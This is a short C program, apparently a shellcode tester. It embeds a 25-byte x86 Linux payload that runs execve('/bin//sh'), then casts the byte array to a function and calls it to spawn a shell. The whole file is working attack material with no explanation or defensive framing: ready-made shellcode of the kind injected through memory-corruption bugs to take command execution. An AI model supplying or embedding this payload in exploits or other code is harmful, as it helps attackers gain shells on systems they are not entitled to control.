#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode Length:  %d\n", (int)strlen(shellcode));

    int (*ret)() = (int(*)())shellcode;
    ret();
}
